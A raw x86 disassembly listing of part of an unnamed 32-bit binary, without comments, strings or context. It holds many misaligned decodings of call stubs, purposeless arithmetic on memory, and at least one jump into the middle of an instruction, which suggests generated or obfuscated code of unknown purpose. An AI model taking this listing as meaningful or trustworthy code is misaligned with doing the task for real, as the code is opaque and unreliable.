  4d10c3:	pop    ebp
  4d10c4:	ret    
  4d10c5:	add    BYTE PTR [eax],al
  4d10c7:	add    BYTE PTR [edi-0x1],bl
  4d10ca:	adc    eax,0x4d2094
  4d10cf:	call   edi
  4d10d1:	add    BYTE PTR [eax],al
  4d10d3:	add    BYTE PTR [edi-0x1],bl
  4d10d6:	adc    eax,0x4d2054
  4d10db:	call   edi
  4d10dd:	add    BYTE PTR [eax],al
  4d10df:	add    BYTE PTR [edi-0x1],bl
  4d10e2:	adc    eax,0x4d2058
  4d10e7:	call   edi
  4d10e9:	add    BYTE PTR [eax],al
  4d10eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10f1:	sub    esp,0x2c
  4d10f4:	mov    eax,0x4d31c4
  4d10f9:	mov    edx,0xffff9176
  4d10fe:	push   eax
  4d10ff:	mov    ecx,0x0
  4d1104:	push   ecx
  4d1105:	call   0x4d0938
  4d110a:	add    esp,0x4
  4d110d:	pop    eax
  4d110e:	push   eax
  4d110f:	push   edi
  4d1110:	push   DWORD PTR [eax+0x1e4]
  4d1116:	call   0x4d13c4
  4d111b:	add    esp,0x8
  4d111e:	pop    eax
  4d111f:	push   eax
  4d1120:	call   0x4d1130
  4d1125:	add    esp,0x4
  4d1128:	pop    eax
  4d1129:	add    esp,0x2c
  4d112c:	pop    ebp
  4d112d:	ret    
  4d112e:	add    BYTE PTR [eax],al
  4d1130:	pop    edi
  4d1131:	call   DWORD PTR ds:0x4d2044
  4d1137:	call   edi
  4d1139:	add    BYTE PTR [eax],al
  4d113b:	add    BYTE PTR [edi-0x1],bl
  4d113e:	adc    eax,0x4d207c
  4d1143:	call   edi
  4d1145:	add    BYTE PTR [eax],al
  4d1147:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d114d:	sub    esp,0x50
  4d1150:	lea    esi,ds:0x4d30d4
  4d1156:	mov    edx,DWORD PTR [esi-0x20]
  4d1159:	push   esi
  4d115a:	push   ecx
  4d115b:	push   eax
  4d115c:	push   eax
  4d115d:	push   DWORD PTR [esi+0x1c0]
  4d1163:	call   0x4d0c5c
  4d1168:	add    esp,0x10
  4d116b:	pop    esi
  4d116c:	mov    ecx,0x0
  4d1171:	push   ecx
  4d1172:	call   0x4d10e0
  4d1177:	add    esp,0x4
  4d117a:	push   0x0
  4d117c:	call   0x4d14c4
  4d1181:	add    esp,0x4
  4d1184:	add    esp,0x50
  4d1187:	pop    ebp
  4d1188:	ret    
  4d1189:	add    BYTE PTR [eax],al
  4d118b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1191:	sub    esp,0x24
  4d1194:	mov    eax,0x4d31bc
  4d1199:	sbb    DWORD PTR [eax-0x54],edi
  4d119c:	push   eax
  4d119d:	push   DWORD PTR [eax+0x1e8]
  4d11a3:	push   DWORD PTR [eax+0x180]
  4d11a9:	call   0x4d12e0
  4d11ae:	add    esp,0x8
  4d11b1:	pop    eax
  4d11b2:	push   eax
  4d11b3:	mov    esi,0x0
  4d11b8:	push   esi
  4d11b9:	call   0x4d14c4
  4d11be:	add    esp,0x4
  4d11c1:	pop    eax
  4d11c2:	push   eax
  4d11c3:	push   0x0
  4d11c5:	call   0x4d0938
  4d11ca:	add    esp,0x4
  4d11cd:	pop    eax
  4d11ce:	add    esp,0x24
  4d11d1:	pop    ebp
  4d11d2:	ret    
  4d11d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11d9:	sub    esp,0x54
  4d11dc:	mov    esi,0x4d31dc
  4d11e1:	sbb    edi,DWORD PTR [ebp-0x50]
  4d11e4:	push   0x0
  4d11e6:	call   0x4d12c8
  4d11eb:	add    esp,0x4
  4d11ee:	push   esi
  4d11ef:	push   DWORD PTR [esi+0xa8]
  4d11f5:	push   DWORD PTR [esi+0xb0]
  4d11fb:	push   eax
  4d11fc:	call   0x4d1088
  4d1201:	add    esp,0xc
  4d1204:	pop    esi
  4d1205:	mov    edi,0x0
  4d120a:	push   edi
  4d120b:	call   0x4d10e0
  4d1210:	add    esp,0x4
  4d1213:	add    esp,0x54
  4d1216:	pop    ebp
  4d1217:	ret    
  4d1218:	pop    edi
  4d1219:	call   DWORD PTR ds:0x4d205c
  4d121f:	call   edi
  4d1221:	add    BYTE PTR [eax],al
  4d1223:	add    BYTE PTR [edi-0x1],bl
  4d1226:	adc    eax,0x4d20a0
  4d122b:	call   edi
  4d122d:	add    BYTE PTR [eax],al
  4d122f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1235:	sub    esp,0x3c
  4d1238:	mov    edi,0x4d309c
  4d123d:	sbb    DWORD PTR [edi-0x60],eax
  4d1240:	push   edi
  4d1241:	push   esi
  4d1242:	push   DWORD PTR [edi+0x2c]
  4d1245:	push   DWORD PTR [edi+0x1a8]
  4d124b:	push   DWORD PTR [edi+0x88]
  4d1251:	call   0x4d0e44
  4d1256:	add    esp,0x10
  4d1259:	pop    edi
  4d125a:	push   edi
  4d125b:	mov    edi,0x0
  4d1260:	push   edi
  4d1261:	call   0x4d09d4
  4d1266:	add    esp,0x4
  4d1269:	pop    edi
  4d126a:	push   edi
  4d126b:	push   0x0
  4d126d:	call   0x4d14c4
  4d1272:	add    esp,0x4
  4d1275:	pop    edi
  4d1276:	add    esp,0x3c
  4d1279:	pop    ebp
  4d127a:	ret    
  4d127b:	add    BYTE PTR [edi-0x1],bl
  4d127e:	adc    eax,0x4d2060
  4d1283:	call   edi
  4d1285:	add    BYTE PTR [eax],al
  4d1287:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d128d:	sub    esp,0x3c
  4d1290:	mov    ebx,0x4d3070
  4d1295:	xor    DWORD PTR [ebx+0x168],edx
  4d129b:	call   0x4d1130
  4d12a0:	add    esp,0x4
  4d12a3:	push   ebx
  4d12a4:	push   DWORD PTR [ebx+0x110]
  4d12aa:	push   eax
  4d12ab:	call   0x4d0ed8
  4d12b0:	add    esp,0x8
  4d12b3:	pop    ebx
  4d12b4:	mov    edi,0x0
  4d12b9:	push   edi
  4d12ba:	call   0x4d147c
  4d12bf:	add    esp,0x4
  4d12c2:	add    esp,0x3c
  4d12c5:	pop    ebp
  4d12c6:	ret    
  4d12c7:	add    BYTE PTR [edi-0x1],bl
  4d12ca:	adc    eax,0x4d2030
  4d12cf:	call   edi
  4d12d1:	add    BYTE PTR [eax],al
  4d12d3:	add    BYTE PTR [edi-0x1],bl
  4d12d6:	adc    eax,0x4d203c
  4d12db:	call   edi
  4d12dd:	add    BYTE PTR [eax],al
  4d12df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12e5:	sub    esp,0x20
  4d12e8:	lea    edx,ds:0x4d3198
  4d12ee:	add    ecx,DWORD PTR [ebp-0x20]
  4d12f1:	push   edx
  4d12f2:	lea    ecx,[edx-0x198]
  4d12f8:	push   ecx
  4d12f9:	call   0x4d0850
  4d12fe:	add    esp,0x4
  4d1301:	test   eax,eax
  4d1303:	jne    0x4d12f2
  4d1305:	pop    edx
  4d1306:	push   edx
  4d1307:	push   DWORD PTR [edx+0x164]
  4d130d:	push   DWORD PTR [edx+0x94]
  4d1313:	push   ebx
  4d1314:	call   0x4d0d74
  4d1319:	add    esp,0xc
  4d131c:	pop    edx
  4d131d:	push   edx
  4d131e:	mov    esi,0x0
  4d1323:	push   esi
  4d1324:	call   0x4d10e0
  4d1329:	add    esp,0x4
  4d132c:	pop    edx
  4d132d:	add    esp,0x20
  4d1330:	pop    ebp
  4d1331:	ret    
  4d1332:	add    BYTE PTR [eax],al
  4d1334:	mov    edi,edi
  4d1336:	push   ebp
  4d1337:	mov    ebp,esp
  4d1339:	sub    esp,0x3c
  4d133c:	lea    esi,[edx+0xc4]
  4d1342:	or     edi,DWORD PTR [esi+0x3c]
  4d1345:	call   0x4d07fc
  4d134a:	add    esp,0x4
  4d134d:	push   esi
  4d134e:	push   ecx
  4d134f:	push   DWORD PTR [esi+0x114]
  4d1355:	push   DWORD PTR [esi+0x138]
  4d135b:	push   DWORD PTR [esi+0x1f0]
  4d1361:	call   0x4d1288
  4d1366:	add    esp,0x10
  4d1369:	pop    esi
  4d136a:	push   0x0
  4d136c:	call   0x4d127c
  4d1371:	add    esp,0x4
  4d1374:	add    esp,0x3c
  4d1377:	pop    ebp
  4d1378:	ret    
  4d1379:	add    BYTE PTR [eax],al
  4d137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1381:	sub    esp,0x44
  4d1384:	mov    esi,0x4d30c0
  4d1389:	mov    ecx,esi
  4d138b:	push   esi
  4d138c:	push   DWORD PTR [esi+0x28]
  4d138f:	push   DWORD PTR [esi+0x154]
  4d1395:	push   edx
  4d1396:	push   ebx
  4d1397:	call   0x4d118c
  4d139c:	add    esp,0x10
  4d139f:	pop    esi
  4d13a0:	lea    edx,[esi-0xc0]
  4d13a6:	push   edx
  4d13a7:	call   0x4d0850
  4d13ac:	add    esp,0x4
  4d13af:	test   eax,eax
  4d13b1:	jne    0x4d13a1
  4d13b3:	push   0x0
  4d13b5:	call   0x4d107c
  4d13ba:	add    esp,0x4
  4d13bd:	add    esp,0x44
  4d13c0:	pop    ebp
  4d13c1:	ret    
  4d13c2:	add    BYTE PTR [eax],al
  4d13c4:	mov    edi,edi
  4d13c6:	push   ebp
  4d13c7:	mov    ebp,esp
  4d13c9:	sub    esp,0x34
  4d13cc:	lea    edx,ds:0x4d30a0
  4d13d2:	adc    ebx,ecx
  4d13d4:	push   edx
  4d13d5:	push   DWORD PTR [edx+0x184]
  4d13db:	push   DWORD PTR [edx+0x10c]
  4d13e1:	push   DWORD PTR [edx+0x8c]
  4d13e7:	push   DWORD PTR [edx+0xc]
  4d13ea:	call   0x4d0cac
  4d13ef:	add    esp,0x10
  4d13f2:	pop    edx
  4d13f3:	push   edx
  4d13f4:	push   0x0
  4d13f6:	call   0x4d127c
  4d13fb:	add    esp,0x4
  4d13fe:	pop    edx
  4d13ff:	push   edx
  4d1400:	call   0x4d1130
  4d1405:	add    esp,0x4
  4d1408:	pop    edx
  4d1409:	add    esp,0x34
  4d140c:	pop    ebp
  4d140d:	ret    
  4d140e:	add    BYTE PTR [eax],al
  4d1410:	pop    edi
  4d1411:	call   DWORD PTR ds:0x4d2078
  4d1417:	call   edi
  4d1419:	add    BYTE PTR [eax],al
  4d141b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1421:	sub    esp,0x20
  4d1424:	lea    ecx,ds:0x4d30e4
  4d142a:	and    DWORD PTR [ebp-0x20],0xffffffa5
  4d142e:	push   ecx
  4d142f:	push   DWORD PTR [ecx+0x1ac]
  4d1435:	push   eax
  4d1436:	push   eax
  4d1437:	push   edx
  4d1438:	call   0x4d0f5c
  4d143d:	add    esp,0x10
  4d1440:	pop    ecx
  4d1441:	push   ecx
  4d1442:	mov    edi,0x0
  4d1447:	push   edi
  4d1448:	call   0x4d14c4
  4d144d:	add    esp,0x4
  4d1450:	pop    ecx
  4d1451:	push   ecx
  4d1452:	push   0x0
  4d1454:	call   0x4d0968
  4d1459:	add    esp,0x4
  4d145c:	pop    ecx
  4d145d:	add    esp,0x20
  4d1460:	pop    ebp
  4d1461:	ret    
  4d1462:	add    BYTE PTR [eax],al
  4d1464:	pop    edi
  4d1465:	call   DWORD PTR ds:0x4d2048
  4d146b:	call   edi
  4d146d:	add    BYTE PTR [eax],al
  4d146f:	add    BYTE PTR [edi-0x1],bl
  4d1472:	adc    eax,0x4d2024
  4d1477:	call   edi
  4d1479:	add    BYTE PTR [eax],al
  4d147b:	add    BYTE PTR [edi-0x1],bl
  4d147e:	adc    eax,0x4d2000
  4d1483:	call   edi
  4d1485:	add    BYTE PTR [eax],al
  4d1487:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d148d:	sub    esp,0x3c
  4d1490:	lea    eax,[edx+0xcc]
  4d1496:	mov    esi,0xffffdd48
  4d149b:	push   eax
  4d149c:	push   edi
  4d149d:	push   ecx
  4d149e:	push   ecx
  4d149f:	push   ecx
  4d14a0:	call   0x4d0ad0
  4d14a5:	add    esp,0x10
  4d14a8:	pop    eax
  4d14a9:	push   eax
  4d14aa:	push   0x0
  4d14ac:	call   0x4d0a80
  4d14b1:	add    esp,0x4
  4d14b4:	pop    eax
  4d14b5:	push   eax
  4d14b6:	call   0x4d07fc
  4d14bb:	add    esp,0x4
  4d14be:	pop    eax
  4d14bf:	add    esp,0x3c
  4d14c2:	pop    ebp
  4d14c3:	ret    
  4d14c4:	pop    edi
  4d14c5:	call   DWORD PTR ds:0x4d2070
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d5:	sub    esp,0x44
  4d14d8:	lea    esi,[ebx+0x13c]
  4d14de:	cmp    esi,0x6766
  4d14e4:	je     0x4d14d3
  4d14e6:	push   esi
  4d14e7:	push   DWORD PTR [esi+0x3c]
  4d14ea:	push   DWORD PTR [esi+0xdc]
  4d14f0:	call   0x4d0868
  4d14f5:	add    esp,0x8
  4d14f8:	pop    esi
  4d14f9:	mov    ebx,0x0
  4d14fe:	push   ebx
  4d14ff:	call   0x4d0968
  4d1504:	add    esp,0x4
  4d1507:	push   0x0
  4d1509:	call   0x4d0968
  4d150e:	add    esp,0x4
  4d1511:	add    esp,0x44
  4d1514:	pop    ebp
  4d1515:	ret    
  4d1516:	add    BYTE PTR [eax],al
  4d1518:	mov    edi,edi
  4d151a:	push   ebp
  4d151b:	mov    ebp,esp
  4d151d:	sub    esp,0x28
  4d1520:	lea    eax,[ebx-0x44]
  4d1523:	sub    ecx,DWORD PTR [ebp-0xc]
  4d1526:	push   eax
  4d1527:	push   DWORD PTR [eax+0x14]
  4d152a:	push   edi
  4d152b:	push   DWORD PTR [eax+0x80]
  4d1531:	call   0x4d0a3c
  4d1536:	add    esp,0xc
  4d1539:	pop    eax
  4d153a:	push   eax
  4d153b:	mov    esi,0x0
  4d1540:	push   esi
  4d1541:	call   0x4d0a80
  4d1546:	add    esp,0x4
  4d1549:	pop    eax
  4d154a:	push   eax
  4d154b:	push   0x0
  4d154d:	call   0x4d0968
  4d1552:	add    esp,0x4
  4d1555:	pop    eax
  4d1556:	add    esp,0x28
  4d1559:	pop    ebp
  4d155a:	ret    
  4d155b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1561:	sub    esp,0x20
  4d1564:	lea    ebx,ds:0x4d3194
  4d156a:	mov    DWORD PTR [ebx-0xe0],0x4aa2
  4d1574:	call   0x4d1130
  4d1579:	add    esp,0x4
  4d157c:	push   ebx
  4d157d:	push   DWORD PTR [ebx+0xc0]
  4d1583:	push   ecx
  4d1584:	call   0x4d1230
  4d1589:	add    esp,0x8
  4d158c:	pop    ebx
  4d158d:	mov    eax,0x0
  4d1592:	push   eax
  4d1593:	call   0x4d12c8
  4d1598:	add    esp,0x4
  4d159b:	add    esp,0x20
  4d159e:	pop    ebp
  4d159f:	ret    
